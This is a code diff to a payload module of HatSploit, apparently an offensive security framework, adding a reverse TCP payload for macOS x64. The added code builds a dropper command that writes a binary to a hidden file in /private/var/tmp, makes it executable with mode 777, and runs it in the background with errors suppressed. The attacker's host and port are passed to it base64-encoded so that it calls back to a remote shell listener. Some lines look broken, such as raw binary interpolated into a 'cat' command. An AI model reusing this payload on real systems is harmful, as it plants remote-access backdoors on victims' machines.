@@ -24,6 +24,8 @@
 # SOFTWARE.
 #
 
+import base64
+
 from core.lib.payload import HatSploitPayload
 
 class HatSploitPayload(HatSploitPayload):
@@ -35,12 +37,39 @@ class HatSploitPayload(HatSploitPayload):
         ],
         'Description': "Membrane Reverse TCP Payload for macOS x64."
     }
+    
+    options = {
+        'LHOST': {
+            'Description': "Local host.",
+            'Value': tcp.get_local_host(),
+            'Type': "ip",
+            'Required': True
+        },
+        'LPORT': {
+            'Description': "Local port.",
+            'Value': 8888,
+            'Type': "port",
+            'Required': True
+        }
+    }
 
     def generate(self):
-        self.badges.output_process("Generating payload...")
+        local_host, local_port = self.parser.parse_options(self.options)
 
+        remote_data = base64.b64encode((local_host + ':' + local_port).encode())
+        remote_data = remote_data.decode()
+
+        self.badges.output_process("Generating payload...")
         binary = open('external/bin/macos_membrane_x64.bin', 'rb')
         payload = binary.read()
         binary.close()
 
-        return payload
+        execute = ""
+        execute += f"cat {payload} > /private/var/tmp/.payload;"
+        execute += f"chmod 777 /private/var/tmp/.payload;"
+        execute += f"sh -c '/private/var/tmp/.payload {remote_data}' 2>/dev/null &"
+
+        self.data['payload'] = payload
+        self.data['execute'] = execute
+
+        return self.data
